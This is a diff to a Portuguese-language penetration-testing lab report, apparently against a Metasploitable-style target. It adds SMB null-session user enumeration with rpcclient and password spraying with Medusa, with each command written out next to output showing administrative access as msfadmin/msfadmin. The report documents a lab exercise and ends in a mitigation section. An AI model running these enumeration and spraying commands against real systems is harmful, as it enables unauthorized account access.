@@ -44,6 +44,18 @@ medusa -h alvo -u msfadmin -P pass.txt -M ssh
 
 - Análise de Resultado: Em ambos os protocolos, o Medusa retornou SUCCESS para a combinação msfadmin/msfadmin em menos de um segundo. Isso prova que o alvo não possui mecanismos de Rate Limiting ou bloqueio de conta.
 
+### 5. Enumeração de Usuários (SMB)
+Extração de contas reais via Null Session para evitar wordlists genéricas:
+`rpcclient -U "" -N alvo -c "enumdomusers" | cut -d "[" -f2 | cut -d "]" -f1 > user_list.txt`
+*Resultado:* 35 usuários identificados (ex: msfadmin, postgres, root).
+
+### 6. Password Spraying (Medusa)
+Teste da credencial `msfadmin` contra toda a lista minerada.
+*Comando:* `medusa -h alvo -U user_list.txt -p msfadmin -M smbnt`
+*Resultado:* `ACCOUNT FOUND: msfadmin / msfadmin [SUCCESS (ADMIN$)]`
+*Análise:* Acesso administrativo confirmado via compartilhamento oculto.
+
+
 ---
 
 ## 📉 Conclusões e Medidas de Mitigação
